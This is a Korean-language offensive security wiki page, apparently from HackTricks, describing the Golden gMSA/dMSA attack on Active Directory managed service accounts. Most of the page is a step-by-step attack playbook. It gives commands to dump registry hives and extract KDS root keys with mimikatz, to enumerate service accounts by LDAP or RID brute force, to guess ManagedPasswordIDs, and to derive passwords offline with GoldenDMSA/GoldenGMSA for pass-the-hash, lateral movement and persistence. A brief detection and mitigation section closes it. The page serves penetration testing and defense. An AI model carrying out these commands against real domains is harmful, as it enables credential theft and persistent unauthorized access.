# Golden gMSA/dMSA Attack (Managed Service Account 비밀번호의 오프라인 파생)

{{#include ../../banners/hacktricks-training.md}}

## 개요

Windows Managed Service Accounts (MSA)는 비밀번호를 수동으로 관리할 필요 없이 서비스를 실행하도록 설계된 특별한 주체입니다.
주요 두 가지 유형이 있습니다:

1. **gMSA** – 그룹 Managed Service Account – `msDS-GroupMSAMembership` 속성에 권한이 부여된 여러 호스트에서 사용할 수 있습니다.
2. **dMSA** – 위임된 Managed Service Account – gMSA의 (미리보기) 후계자로, 동일한 암호화에 의존하지만 더 세분화된 위임 시나리오를 허용합니다.

두 변형 모두 **비밀번호는** 일반 NT 해시처럼 각 도메인 컨트롤러(DC)에 저장되지 않습니다. 대신 모든 DC는 다음 세 가지 입력값으로부터 현재 비밀번호를 **즉석에서 파생**할 수 있습니다:

* 포리스트 전체의 **KDS Root Key** (`KRBTGT\KDS`) – 무작위로 생성된 GUID 이름의 비밀로, `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` 컨테이너 아래의 모든 DC에 복제됩니다.
* 대상 계정의 **SID**.
* `msDS-ManagedPasswordId` 속성에서 찾을 수 있는 계정별 **ManagedPasswordID** (GUID).

파생 과정은: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 바이트 블롭이 최종적으로 **base64 인코딩**되어 `msDS-ManagedPassword` 속성에 저장됩니다.
정상적인 비밀번호 사용 중에는 Kerberos 트래픽이나 도메인 상호작용이 필요하지 않으며, 멤버 호스트는 세 가지 입력값을 알고 있는 한 로컬에서 비밀번호를 파생합니다.

## Golden gMSA / Golden dMSA 공격

공격자가 모든 세 가지 입력값을 **오프라인**으로 얻을 수 있다면, **도메인 내의 모든 gMSA/dMSA에 대한 유효한 현재 및 미래 비밀번호**를 계산할 수 있으며, 다시 DC에 접근하지 않고도 다음을 우회할 수 있습니다:

* LDAP 읽기 감사
* 비밀번호 변경 간격 (사전 계산 가능)

이는 서비스 계정에 대한 *Golden Ticket*에 비유할 수 있습니다.

### 전제 조건

1. **하나의 DC** (또는 Enterprise Admin)의 **포리스트 수준 손상**, 또는 포리스트 내의 DC 중 하나에 대한 `SYSTEM` 접근.
2. 서비스 계정을 열거할 수 있는 능력 (LDAP 읽기 / RID 무차별 대입).
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) 또는 동등한 코드를 실행할 수 있는 .NET ≥ 4.7.2 x64 워크스테이션.

### Golden gMSA / dMSA
##### 1단계 – KDS Root Key 추출

모든 DC에서 덤프 (볼륨 섀도 복사 / 원시 SAM+SECURITY 하이브 또는 원격 비밀):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey` (GUID 이름)으로 레이블된 base64 문자열은 이후 단계에서 필요합니다.

##### Phase 2 – gMSA / dMSA 객체 열거

최소한 `sAMAccountName`, `objectSid` 및 `msDS-ManagedPasswordId`를 검색합니다:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA)는 헬퍼 모드를 구현합니다:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – ManagedPasswordID 추측 / 발견 (누락 시)

일부 배포에서는 `msDS-ManagedPasswordId`를 ACL 보호 읽기에서 *제거*합니다.  
GUID가 128비트이기 때문에 단순한 무차별 대입은 불가능하지만:

1. 첫 번째 **32비트 = 계정 생성의 Unix epoch 시간** (분 단위 해상도).
2. 그 뒤에 96비트의 무작위 비트가 이어집니다.

따라서 **계정당 좁은 단어 목록** (± 몇 시간)이 현실적입니다.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
도구는 후보 비밀번호를 계산하고 그들의 base64 blob을 실제 `msDS-ManagedPassword` 속성과 비교합니다. 일치하면 올바른 GUID가 드러납니다.

##### Phase 4 – 오프라인 비밀번호 계산 및 변환

ManagedPasswordID가 알려지면, 유효한 비밀번호는 한 명령어 거리입니다:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
결과 해시는 **mimikatz** (`sekurlsa::pth`) 또는 **Rubeus**를 사용하여 Kerberos 남용에 주입될 수 있으며, 이는 은밀한 **측면 이동** 및 **지속성**을 가능하게 합니다.

## 탐지 및 완화

* **DC 백업 및 레지스트리 하이브 읽기** 기능을 Tier-0 관리자에게 제한합니다.
* DC에서 **디렉터리 서비스 복원 모드 (DSRM)** 또는 **볼륨 섀도 복사** 생성을 모니터링합니다.
* 서비스 계정의 `CN=Master Root Keys,…` 및 `userAccountControl` 플래그에 대한 읽기/변경을 감사합니다.
* 비정상적인 **base64 비밀번호 쓰기** 또는 호스트 간의 갑작스러운 서비스 비밀번호 재사용을 감지합니다.
* Tier-0 격리가 불가능한 경우, 높은 권한의 gMSA를 **클래식 서비스 계정**으로 변환하고 정기적으로 무작위 회전을 고려합니다.

## 도구

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – 이 페이지에서 사용된 참조 구현.
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – 이 페이지에서 사용된 참조 구현.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – 파스-더-티켓을 사용하여 파생된 AES 키를 이용합니다.

## 참고 문헌

- [Golden dMSA – 위임된 관리 서비스 계정에 대한 인증 우회](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [gMSA Active Directory 공격 계정](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Semperis/GoldenDMSA GitHub 리포지토리](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA 신뢰 공격](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
